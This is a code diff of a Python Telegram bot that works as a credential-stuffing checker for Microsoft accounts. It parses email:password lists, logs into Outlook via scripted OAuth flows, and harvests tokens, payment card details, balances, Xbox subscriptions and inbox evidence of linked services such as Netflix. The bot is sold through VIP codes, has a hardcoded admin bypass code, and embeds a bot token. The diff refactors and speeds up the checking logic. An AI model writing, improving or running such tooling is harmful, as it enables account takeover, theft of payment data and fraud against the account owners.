@@ -15,7 +15,7 @@ import random
 import secrets
 import email as email_lib
 from email.header import decode_header as decode_hdr
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
 from datetime import datetime, timedelta
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
@@ -23,9 +23,22 @@ GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
 API_BASE = "https://api.telegram.org/bot"
 FILE_BASE = "https://api.telegram.org/file/bot"
 
-def api(method, data=None, files=None):
-    r = requests.post(f"{API_BASE}{BOT_TOKEN}/{method}", data=data, files=files, timeout=60)
-    return r.json()
+# ── per-account hard timeout (seconds) ──────────────────────────
+ACCOUNT_TIMEOUT = 90
+
+# ── Telegram API ─────────────────────────────────────────────────
+def api(method, data=None, files=None, _retries=2):
+    for attempt in range(_retries + 1):
+        try:
+            r = requests.post(
+                f"{API_BASE}{BOT_TOKEN}/{method}",
+                data=data, files=files, timeout=(5, 30))
+            return r.json()
+        except Exception as e:
+            if attempt == _retries:
+                return {}
+            time.sleep(1)
+    return {}
 
 def get_updates(offset=None, timeout=30):
     data = {"timeout": timeout}
@@ -34,19 +47,22 @@ def get_updates(offset=None, timeout=30):
     return api("getUpdates", data)
 
 def send_message(chat_id, text, reply_markup=None):
-    data = {"chat_id": chat_id, "text": text}
+    data = {"chat_id": chat_id, "text": str(text)[:4096]}
     if reply_markup:
         data["reply_markup"] = json.dumps(reply_markup)
     return api("sendMessage", data)
 
 def edit_message(chat_id, message_id, text):
-    data = {"chat_id": chat_id, "message_id": message_id, "text": text}
-    return api("editMessageText", data)
+    data = {"chat_id": chat_id, "message_id": message_id, "text": str(text)[:4096]}
+    try:
+        return api("editMessageText", data)
+    except Exception:
+        return {}
 
-# ------------------- Access control / VIP -------------------
+# ── Access control / VIP ─────────────────────────────────────────
 CONTROL_GROUP_ID = int(os.getenv("CONTROL_GROUP_ID", "-1002789978571"))
 ADMIN_ID = int(os.getenv("ADMIN_ID", "7677328359"))
-VIP_WINDOW_SECONDS = 2 * 60 * 60  # 2 hours for normal users
+VIP_WINDOW_SECONDS = 2 * 60 * 60
 NORMAL_LIMIT = 100
 
 vip_codes = {}
@@ -63,15 +79,10 @@ def generate_random_code(length=10):
 def create_vip_code(duration_type):
     code = generate_random_code(10)
     now = time.time()
-    if duration_type == "day":
-        duration = 86400
-    elif duration_type == "week":
-        duration = 86400 * 7
-    elif duration_type == "month":
-        duration = 86400 * 30
-    else:
-        duration = 3600
-    vip_codes[code] = {"expires": now + duration, "claimed_by": None, "duration_type": duration_type, "duration": duration}
+    durations = {"day": 86400, "week": 86400*7, "month": 86400*30}
+    duration = durations.get(duration_type, 3600)
+    vip_codes[code] = {"expires": now + duration, "claimed_by": None,
+                       "duration_type": duration_type, "duration": duration}
     return code
 
 def try_claim_vip(user_id, code):
@@ -79,7 +90,6 @@ def try_claim_vip(user_id, code):
     if code_str == "codevipanon199":
         vip_users_info[user_id] = {"expires": time.time() + 315360000, "code": "ADMIN_OVERRIDE"}
         return True, "Unlimited VIP activated"
-    
     info = vip_codes.get(code_str)
     if not info:
         return False, "Code not found"
@@ -87,7 +97,6 @@ def try_claim_vip(user_id, code):
         return False, "Code expired"
     if info["claimed_by"] and info["claimed_by"] != user_id:
         return False, "Code already used"
-    
     info["claimed_by"] = user_id
     vip_users_info[user_id] = {"expires": time.time() + info["duration"], "code": code_str}
     return True, f"VIP activated ({info['duration_type']})"
@@ -117,7 +126,11 @@ def schedule_limit_reset_message(user_id):
         delay = max(0, int(VIP_WINDOW_SECONDS - (time.time() - ws)))
         def _runner():
             time.sleep(delay)
-            send_message(user_id, "you can now send another 100 accounts\nor you can buy this : \nunlimited check\nSearch with your keywords\nif want send msg here : @anon_101")
+            send_message(user_id,
+                "you can now send another 100 accounts\n"
+                "or you can buy this : \nunlimited check\n"
+                "Search with your keywords\n"
+                "if want send msg here : @anon_101")
         threading.Thread(target=_runner, daemon=True).start()
     except: pass
 
@@ -125,37 +138,37 @@ def check_vip_expiry():
     while True:
         try:
             now = time.time()
-            expired = [uid for uid, info in list(vip_users_info.items()) if now > info.get("expires", 0)]
+            expired = [uid for uid, info in list(vip_users_info.items())
+                       if now > info.get("expires", 0)]
             for uid in expired:
                 vip_users_info.pop(uid, None)
                 send_message(uid, "Your VIP subscription has expired. To renew, contact: @anon_101")
-        except:
-            pass
+        except: pass
         time.sleep(60)
 
 threading.Thread(target=check_vip_expiry, daemon=True).start()
 
 def send_document(chat_id, path, caption=None):
-    with open(path, "rb") as f:
-        files = {"document": f}
-        data = {"chat_id": chat_id}
-        if caption:
-            data["caption"] = caption
-        return api("sendDocument", data, files=files)
+    try:
+        with open(path, "rb") as f:
+            files = {"document": f}
+            data = {"chat_id": chat_id}
+            if caption:
+                data["caption"] = str(caption)[:1024]
+            return api("sendDocument", data, files=files)
+    except Exception:
+        return {}
 
-# ------------------- Dates and Currency Helpers (from q.py) -------------------
+# ── Helpers ───────────────────────────────────────────────────────
 from datetime import datetime
 
 def get_remaining_days(date_str):
     try:
-        if not date_str:
-            return "0"
+        if not date_str: return "0"
         renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
         today = datetime.now(renewal_date.tzinfo)
-        remaining = (renewal_date - today).days
-        return str(remaining)
-    except:
-        return "0"
+        return str((renewal_date - today).days)
+    except: return "0"
 
 CURRENCY_SYMBOLS = {
     "USD": "$", "EUR": "€", "GBP": "£", "JPY": "¥", "CNY": "¥",
@@ -167,49 +180,40 @@ CURRENCY_SYMBOLS = {
     "NZD": "$", "CAD": "$", "MXN": "$", "ARS": "$", "CLP": "$",
     "COP": "$", "BRL": "R$", "PHP": "₱", "NGN": "₦", "ZAR": "R",
 }
-
 AMBIGUOUS_CODES = {"USD", "CAD", "AUD", "NZD", "MXN", "ARS", "CLP", "COP", "HKD", "SGD", "CNY", "JPY"}
 
 def format_currency(amount, code=None):
     try:
         amt_str = str(amount).strip()
-        if code:
-            code = code.upper().strip()
+        if code: code = code.upper().strip()
         sym = CURRENCY_SYMBOLS.get(code or "", "")
         if sym:
-            if code in AMBIGUOUS_CODES:
-                return f"{sym}{amt_str} {code}"
-            return f"{sym}{amt_str}"
-        if code:
-            return f"{amt_str} {code}"
-        return amt_str
-    except:
-        return str(amount)
+            return f"{sym}{amt_str} {code}" if code in AMBIGUOUS_CODES else f"{sym}{amt_str}"
+        return f"{amt_str} {code}" if code else amt_str
+    except: return str(amount)
 
 def get_file(file_id):
     j = api("getFile", {"file_id": file_id})
-    if not j.get("ok"):
-        return None
+    if not j.get("ok"): return None
     fp = j["result"]["file_path"]
-    r = requests.get(f"{FILE_BASE}{BOT_TOKEN}/{fp}", timeout=60)
-    return r.content
+    try:
+        r = requests.get(f"{FILE_BASE}{BOT_TOKEN}/{fp}", timeout=(5, 60))
+        return r.content
+    except: return None
 
 def get_ip():
     try:
-        return requests.get("https://api.ipify.org", timeout=10).text
-    except:
-        return "unknown"
+        return requests.get("https://api.ipify.org", timeout=5).text
+    except: return "unknown"
 
 def parse_accounts_bytes(data):
     if not data: return []
-    # robust cleaning: remove duplicates, empty lines, only keep email:pass
     lines = data.decode(errors="ignore").replace("\r\n", "\n").split("\n")
     out = []
     seen = set()
     for ln in lines:
         ln = ln.strip()
         if not ln: continue
-        # use regex to find email:pass
         match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,10}):(\S+)', ln)
         if match:
             em = match.group(1).lower().strip()
@@ -221,16 +225,27 @@ def parse_accounts_bytes(data):
     return out
 
 
+# ═══════════════════════════════════════════════════════════════
+#  UnifiedChecker — optimised: parallel service checks, no IMAP fallback
+# ═══════════════════════════════════════════════════════════════
 class UnifiedChecker:
+    # ─── timeouts: (connect_timeout, read_timeout) ───────────────
+    _T_FAST  = (4, 8)   # fast requests (search, count)
+    _T_LOGIN = (4, 12)  # login requests
+    _T_SUBS  = (4, 10)  # subscriptions
+
     def __init__(self, debug=False, custom_services=None):
         self.session = requests.Session()
         self.session.trust_env = False
         self.session.proxies = {}
-        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=0)
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=10, pool_maxsize=20, max_retries=0)
         self.session.mount('https://', adapter)
         self.session.mount('http://', adapter)
         self.uuid = str(uuid.uuid4())
         self.debug = debug
+
+        # services_map: query_string → display_name
         self.services_map = custom_services or {
             'advertise-support.facebook.com': 'Facebook',
             'mail.instagram.com': 'Instagram',
@@ -278,8 +293,7 @@ class UnifiedChecker:
         }
 
     def log(self, msg):
-        if self.debug:
-            print(msg)
+        if self.debug: print(msg)
 
     def parse_country_from_json(self, j):
         try:
@@ -291,8 +305,7 @@ class UnifiedChecker:
                     for acc in j['accounts']:
                         if isinstance(acc, dict) and acc.get('location'):
                             return str(acc['location'])
-        except:
-            pass
+        except: pass
         return ''
 
     def parse_name_from_json(self, j):
@@ -301,170 +314,155 @@ class UnifiedChecker:
                 for k in ['displayName', 'name', 'givenName', 'fullName']:
                     if k in j and j[k]:
                         return str(j[k])
-        except:
-            pass
+        except: pass
         return ''
 
+    # ── Login ─────────────────────────────────────────────────────
     def _ms_hard_login(self, email, password):
         try:
-            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
-            h1 = {
-                "X-OneAuth-AppName": "Outlook Lite",
-                "X-Office-Version": "3.11.0-minApi24",
-                "X-CorrelationId": self.uuid,
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
-                "Host": "odc.officeapps.live.com",
-                "Connection": "Keep-Alive",
-                "Accept-Encoding": "gzip"
-            }
-            r1 = self.session.get(url1, headers=h1, timeout=15)
+            # Step 1: IDP check
+            r1 = self.session.get(
+                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
+                headers={
+                    "X-OneAuth-AppName": "Outlook Lite",
+                    "X-Office-Version": "3.11.0-minApi24",
+                    "X-CorrelationId": self.uuid,
+                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
+                    "Host": "odc.officeapps.live.com",
+                    "Connection": "Keep-Alive",
+                    "Accept-Encoding": "gzip"
+                }, timeout=self._T_LOGIN)
             if "MSAccount" not in r1.text:
                 return None
-            time.sleep(0.3)
-            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=15)
-            m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
-            m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
+
+            time.sleep(0.2)
+
+            # Step 2: Get auth page
+            url2 = (
+                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
+                "?client_info=1&haschrome=1"
+                f"&login_hint={email}&mkt=en&response_type=code"
+                "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+                "&scope=profile%20openid%20offline_access"
+                "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
+                "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
+            )
+            r2 = self.session.get(url2,
+                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+                allow_redirects=True, timeout=self._T_LOGIN)
+
+            m_url  = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
+            m_ppft = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^\"]+)\"', r2.text)
             if not m_url or not m_ppft:
                 return None
+
             post_url = m_url.group(1).replace("\\/", "/")
-            ppft = m_ppft.group(1)
-            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
-            h3 = {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-                "Origin": "https://login.live.com",
-                "Referer": r2.url
-            }
-            r3 = self.session.post(post_url, data=login_data, headers=h3, allow_redirects=False, timeout=10)
-            loc = r3.headers.get("Location", "")
-            if not loc:
+            ppft     = m_ppft.group(1)
+
+            # Step 3: POST credentials
+            login_data = (
+                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
+                "&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
+                f"&passwd={urllib.parse.quote(password)}&ps=2"
+                "&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK="
+                "&canary=&ctx=&hpgrequestid="
+                f"&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
+                "&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
+                "&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
+            )
+            r3 = self.session.post(post_url, data=login_data,
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "Mozilla/5.0",
+                    "Origin": "https://login.live.com",
+                    "Referer": r2.url,
+                }, allow_redirects=False, timeout=self._T_LOGIN)
+
+            resp_low = r3.text.lower()
+            if "account or password is incorrect" in resp_low:
                 return None
+            if any(x in r3.text for x in ["identity/confirm", "Consent", "Abuse"]):
+                return None
+
+            loc = r3.headers.get("Location", "")
             m_code = re.search(r'code=([^&]+)', loc)
             if not m_code:
                 return None
             code = m_code.group(1)
-            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
-                                   data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
-            if r4.status_code != 200 or "access_token" not in r4.text:
-                return None
-            j = r4.json()
-            at = j.get("access_token", "")
-            rt = j.get("refresh_token", "")
-            cid = (self.session.cookies.get("MSPCID", "") or "").upper()
-            return {"access_token": at, "refresh_token": rt, "cid": cid}
-        except:
-            return None
 
-    # Token flow (from q.py) as alternative to _ms_hard_login
-    def get_ms_tokens(self, email, password):
-        try:
-            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
-            headers1 = {
-                "X-OneAuth-AppName": "Outlook Lite",
-                "X-Office-Version": "3.11.0-minApi24",
-                "X-CorrelationId": self.uuid,
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
-                "Host": "odc.officeapps.live.com",
-                "Connection": "Keep-Alive",
-                "Accept-Encoding": "gzip"
-            }
-            r1 = self.session.get(url1, headers=headers1, timeout=15)
-            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
-                return None
-            if "MSAccount" not in r1.text:
-                return None
-            time.sleep(0.3)
-            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            headers2 = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Connection": "keep-alive"
-            }
-            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
-            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
-            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
-            if not url_match or not ppft_match:
-                return None
-            post_url = url_match.group(1).replace("\\/", "/")
-            ppft = ppft_match.group(1)
-            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
-            headers3 = {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Origin": "https://login.live.com",
-                "Referer": r2.url
-            }
-            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=10)
-            response_text = r3.text.lower()
-            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
-                return None
-            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
-                return None
-            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
-                return None
-            if "https://account.live.com/Abuse" in r3.text:
-                return None
-            location = r3.headers.get("Location", "")
-            if not location:
-                return None
-            code_match = re.search(r'code=([^&]+)', location)
-            if not code_match:
-                return None
-            code = code_match.group(1)
             mspcid = self.session.cookies.get("MSPCID", "")
             if not mspcid:
                 return None
             cid = mspcid.upper()
-            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
-                                   data=token_data,
-                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
-                                   timeout=10)
-            if "access_token" not in r4.text:
+
+            # Step 4: Exchange code for tokens
+            token_data = (
+                "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
+                "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
+                f"&grant_type=authorization_code&code={code}"
+                "&scope=profile%20openid%20offline_access"
+                "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            )
+            r4 = self.session.post(
+                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+                data=token_data,
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                timeout=self._T_LOGIN)
+            if r4.status_code != 200 or "access_token" not in r4.text:
                 return None
-            token_json = r4.json()
+
+            j = r4.json()
             return {
-                "access_token": token_json.get("access_token", ""),
-                "refresh_token": token_json.get("refresh_token", ""),
+                "access_token":  j.get("access_token", ""),
+                "refresh_token": j.get("refresh_token", ""),
                 "cid": cid
             }
-        except:
+        except requests.exceptions.Timeout:
+            return None
+        except Exception:
             return None
 
+    # ── Profile & inbox ──────────────────────────────────────────
     def _graph_msg_count(self, at):
         try:
-            r = self.session.get("https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
-                                 headers={"Authorization": f"Bearer {at}"}, timeout=12)
+            r = self.session.get(
+                "https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
+                headers={"Authorization": f"Bearer {at}"},
+                timeout=self._T_FAST)
             if r.status_code == 200:
                 return r.json().get("totalItemCount", 0)
-        except:
-            pass
+        except: pass
         return 0
 
     def _profile(self, at, cid):
-        country = ""
-        name = ""
         try:
-            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
-                                 headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"}, timeout=15)
+            r = self.session.get(
+                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
+                headers={
+                    "Authorization": f"Bearer {at}",
+                    "X-AnchorMailbox": f"CID:{cid}"
+                }, timeout=self._T_FAST)
             if r.status_code == 200:
                 j = r.json()
-                country = self.parse_country_from_json(j)
-                name = self.parse_name_from_json(j)
-        except:
-            pass
-        return country, name
+                return self.parse_country_from_json(j), self.parse_name_from_json(j)
+        except: pass
+        return "", ""
 
+    # ── Microsoft subscriptions / balance ────────────────────────
     def check_microsoft_subscriptions(self, email, password, at, cid):
         try:
             user_id = str(uuid.uuid4()).replace('-', '')[:16]
             state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
-            url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + urllib.parse.quote(state_json)
-            r = self.session.get(url, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=20)
+            url = ("https://login.live.com/oauth20_authorize.srf"
+                   "?client_id=000000000004773A&response_type=token"
+                   "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
+                   "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
+                   "&state=" + urllib.parse.quote(state_json))
+            r = self.session.get(url,
+                headers={"User-Agent": "Mozilla/5.0"},
+                allow_redirects=True, timeout=self._T_SUBS)
             payment_token = None
             text = r.text + " " + r.url
             for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
@@ -473,7 +471,9 @@ class UnifiedChecker:
                     payment_token = urllib.parse.unquote(m.group(1))
                     break
             if not payment_token:
-                return {"ms_status": "FREE", "ms_data": {}, "xbox": {"status": "FREE", "details": ""}}
+                return {"ms_status": "FREE", "ms_data": {},
+                        "xbox": {"status": "FREE", "details": ""}}
+
             ms_data = {}
             h = {
                 "User-Agent": "Mozilla/5.0",
@@ -483,33 +483,38 @@ class UnifiedChecker:
                 "Origin": "https://account.microsoft.com",
                 "Referer": "https://account.microsoft.com/"
             }
+
+            # Balance + cards (single request)
             try:
-                pay_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
-                r_pay = self.session.get(pay_url, headers=h, timeout=15)
+                r_pay = self.session.get(
+                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me"
+                    "/paymentInstrumentsEx?status=active,removed&language=en-US",
+                    headers=h, timeout=self._T_SUBS)
                 if r_pay.status_code == 200:
-                    # Capture multiple balances
-                    balances = re.findall(r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?).*?"currency(?:Code)?"\s*:\s*"([A-Z]{3})"', r_pay.text)
+                    balances = re.findall(
+                        r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?).*?"currency(?:Code)?"\s*:\s*"([A-Z]{3})"',
+                        r_pay.text)
                     if balances:
-                        # sum up or list all balances with their currencies
-                        ms_data["balances"] = [f"{amt} {cur}" for amt, cur in balances]
-                        # for backward compatibility, keep balance_amount/currency of the first one
-                        ms_data["balance_amount"] = balances[0][0]
+                        ms_data["balances"] = [f"{a} {c}" for a, c in balances]
+                        ms_data["balance_amount"]   = balances[0][0]
                         ms_data["balance_currency"] = balances[0][1]
-                    
-                    # Capture cards (Visa, Master, etc.)
-                    cards = re.findall(r'"paymentMethodFamily"\s*:\s*"([^"]+)".*?"name"\s*:\s*"([^"]+)".*?"lastFourDigits"\s*:\s*"([^"]*)"', r_pay.text, re.DOTALL)
+                    cards = re.findall(
+                        r'"paymentMethodFamily"\s*:\s*"([^"]+)".*?"name"\s*:\s*"([^"]+)"'
+                        r'.*?"lastFourDigits"\s*:\s*"([^"]*)"',
+                        r_pay.text, re.DOTALL)
                     if cards:
-                        ms_data["cards"] = [f"{fam} {name} (***{last})" for fam, name, last in cards]
-                    
+                        ms_data["cards"] = [f"{f} {n} (***{l})" for f, n, l in cards]
                     m3 = re.search(r'"availablePoints"\s*:\s*(\d+)', r_pay.text)
                     if m3:
                         ms_data["rewards_points"] = m3.group(1)
-            except:
-                pass
+            except: pass
+
+            # Xbox subscription
             xbox = {"status": "FREE", "details": ""}
             try:
-                tr_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
-                r_sub = self.session.get(tr_url, headers=h, timeout=15)
+                r_sub = self.session.get(
+                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
+                    headers=h, timeout=self._T_SUBS)
                 if r_sub.status_code == 200:
                     t = r_sub.text
                     kw = {
@@ -522,78 +527,28 @@ class UnifiedChecker:
                     for k, nm in kw.items():
                         if k in t:
                             m = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', t)
-                            details = nm
-                            # compute remaining days if available
                             if m:
                                 days = get_remaining_days(m.group(1))
-                                try:
-                                    if days.startswith('-'):
-                                        # expired -> treat as FREE (do not show)
-                                        break
-                                    else:
-                                        details = f"{nm} ({days}d)"
-                                except:
-                                    details = nm
-                            if m:
-                                # if renewal date present and not expired, mark premium
-                                xbox = {"status": "PREMIUM", "details": details}
+                                if not days.startswith('-'):
+                                    xbox = {"status": "PREMIUM", "details": f"{nm} ({days}d)"}
                             else:
                                 xbox = {"status": "PREMIUM", "details": nm}
                             break
-            except:
-                pass
-            return {"ms_status": "PREMIUM" if xbox["status"] != "FREE" else "FREE", "ms_data": ms_data, "xbox": xbox}
+            except: pass
+
+            return {
+                "ms_status": "PREMIUM" if xbox["status"] != "FREE" else "FREE",
+                "ms_data": ms_data,
+                "xbox": xbox
+            }
         except Exception:
-            return {"ms_status": "ERROR", "ms_data": {}, "xbox": {"status": "ERROR", "details": ""}}
+            return {"ms_status": "ERROR", "ms_data": {},
+                    "xbox": {"status": "ERROR", "details": ""}}
 
-    def _imap_xoauth2_connect(self, email_addr, access_token, host='outlook.office365.com', port=993):
+    # ── Core Outlook Search (no IMAP fallback) ───────────────────
+    def _search_count(self, access_token, cid, query, timeout=8):
+        """Single Outlook search, returns total count. Fast path only."""
         try:
-            auth_bytes = f"user={email_addr}\x01auth=Bearer {access_token}\x01\x01".encode()
-            auth_b64 = base64.b64encode(auth_bytes)
-            ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
-            mail = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
-            mail.authenticate('XOAUTH2', lambda _: auth_b64)
-            return mail, None
-        except Exception as e:
-            return None, str(e)[:80]
-
-    def _imap_fetch_latest_from(self, email_addr, access_token, sender_substr, host='imap-mail.outlook.com', count=200):
-        try:
-            mail, err = self._imap_xoauth2_connect(email_addr, access_token, host, 993)
-            if not mail:
-                return None, None
-            mail.select('INBOX', readonly=True)
-            typ, data = mail.search(None, 'ALL')
-            ids = data[0].split() if data and data[0] else []
-            ids = list(reversed(ids[-count:] if len(ids) > count else ids))
-            ss = sender_substr.lower()
-            for mid in ids:
-                t, md = mail.fetch(mid, '(RFC822)')
-                if t != 'OK' or not md:
-                    continue
-                raw = md[0][1] if isinstance(md[0], tuple) else b''
-                msg = email_lib.message_from_bytes(raw)
-                frm = (msg.get('From') or '').lower()
-                if ss in frm:
-                    subj = msg.get('Subject') or ''
-                    dt = msg.get('Date') or ''
-                    return subj, dt
-        except:
-            pass
-        return None, None
-
-    def check_netflix(self, access_token, cid, email_addr):
-        try:
-            url = "https://outlook.live.com/search/api/v2/query"
-            h = {
-                'User-Agent': 'Outlook-Android/2.0',
-                'Authorization': f'Bearer {access_token}',
-                'X-AnchorMailbox': f'CID:{cid}',
-                'Content-Type': 'application/json'
-            }
-            q = 'info@account.netflix.com'
             payload = {
                 "Cvid": str(uuid.uuid4()),
                 "Scenario": {"Name": "owa.react"},
@@ -605,168 +560,34 @@ class UnifiedChecker:
                     "Filter": {"Or": [
                         {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                         {"Term": {"DistinguishedFolderName": "DeletedItems"}},
-                        {"Term": {"DistinguishedFolderName": "Inbox"}}
-                    ]},
-                    "From": 0,
-                    "Query": {"QueryString": q},
-                    "Size": 50,
-                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
-                }]
-            }
-            r = self.session.post(url, json=payload, headers=h, timeout=10)
-            if r.status_code == 200:
-                data = r.json()
-                total = 0
-                last_s = ""
-                last_d = ""
-                for es in data.get('EntitySets', []):
-                    for rs in es.get('ResultSets', []):
-                        total = rs.get('Total', 0)
-                        if total > 0 and rs.get('Results'):
-                            last = rs['Results'][0]
-                            last_s = last.get('Subject', '')
-                            last_d = last.get('ReceivedDateTime', '')
-                        break
-                if not last_s or not last_d:
-                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'account.netflix.com')
-                    if s2:
-                        last_s = s2
-                    if d2:
-                        last_d = d2
-                return {"netflix_status": "LINKED" if total > 0 else "FREE", "netflix_emails": total, "netflix_last_subject": last_s[:100], "netflix_last_date": last_d[:20]}
-            return {"netflix_status": "FREE", "netflix_emails": 0}
